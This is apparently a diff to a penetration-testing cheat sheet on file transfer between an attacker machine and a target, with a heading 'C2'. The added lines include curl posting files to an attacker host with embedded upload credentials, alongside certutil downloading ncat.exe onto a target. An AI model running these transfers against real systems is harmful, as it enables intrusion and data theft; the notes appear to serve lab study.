@@ -2,13 +2,18 @@
 
 # C2
 
-##### HTTP
+##### HTTP GET
 ```python
 python -m SimpleHTTPServer $port
 ```
 
 ```python
 python3 -m http.server $port
+```
+
+##### HTTP PUT
+```python
+python3 -m uploadserver --basic-auth-upload offsec:wandton
 ```
 
 ##### FTP
@@ -30,13 +35,14 @@ sudo atftpd --daemon --port 69 /tftp` )
 
 # On the target
 
-## Bidirectional
-
 ##### HTTP
 ```powershell
 certutil.exe -urlcache -split -f "http://192.168.45.182:8000/ncat.exe"
 ```
 
+```bash
+curl -X POST http://$tip:8000/upload -F 'files=@$filename' -u offsec:wandton
+```
 ##### SSH
 ```bash
 scp $file $user@$hip:"C:\\Users\\$user\\Downloads"
